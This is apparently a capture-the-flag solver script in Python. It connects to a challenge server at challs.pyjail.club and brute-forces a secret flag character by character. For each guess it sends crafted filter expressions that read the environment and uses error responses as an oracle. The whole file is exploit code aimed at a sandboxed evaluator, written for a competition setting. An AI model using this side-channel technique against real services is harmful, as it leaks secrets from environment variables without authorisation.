import socket
import json
import solve_remote_live

RAW_CHAINS = json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON)
CHAINS = {int(k): v for k, v in RAW_CHAINS.items()}

def predicate(ops):
    parts = []
    for op in ops:
        parts.append(op)
        parts.append("normals")
    return "|".join(parts)

def main():
    s = socket.create_connection(("challs.pyjail.club", 20219), timeout=15)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    buf = b""
    while b"expr: " not in buf:
        chunk = s.recv(4096)
        if not chunk: break
        buf += chunk
    buf = buf.split(b"expr: ", 1)[1]

    # Test positions 5..10 for characters
    charset = "abcdefghijklmnopqrstuvwxyz0123456789_}"
    
    for pos in range(5, 12):
        found = []
        for c in charset:
            v = ord(c)
            add_val = pos + v
            if add_val not in CHAINS:
                continue
            pred = predicate(CHAINS[add_val])
            expr = f"env|flatten|sort|last|explode|tostream|flatten|add|{pred}|error\n"
            s.sendall(expr.encode())
            
            token_re = solve_remote_live.TOKEN_RE
            while True:
                m = token_re.search(buf)
                if m:
                    ans = m.group(1).decode()
                    buf = buf[m.end():]
                    if ans == "error":
                        found.append(c)
                    break
                chunk = s.recv(4096)
                if not chunk: break
                buf += chunk
        print(f"[Pos {pos:2d}] candidates matched: {found}")
        
    s.close()

if __name__ == "__main__":
    main()
